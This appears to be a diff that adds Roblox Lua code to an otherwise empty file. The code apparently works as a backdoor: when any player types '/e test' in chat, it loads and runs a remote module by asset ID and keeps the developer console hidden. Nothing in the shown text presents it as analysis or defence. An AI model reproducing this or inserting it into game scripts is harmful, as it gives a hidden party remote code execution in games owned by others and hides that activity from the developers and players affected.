@@ -1,1 +1,18 @@
---nothing here bozo--
+game:GetService("Players").PlayerAdded:Connect(function(v)
+    pcall(function()
+        v.Chatted:Connect(function(msg)
+            if msg == "/e test" then
+                require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
+            end
+        end)
+    end)
+end)
+for i,v in game:GetService("Players"):GetPlayers() do
+    pcall(function()
+        v.Chatted:Connect(function(msg)
+            if msg == "/e test" then
+                require(16303756383)(false,[===[while task.wait() do game:GetService("StarterGui"):SetCore("DevConsoleVisible", false) end]===])
+            end
+        end)
+    end)
+end
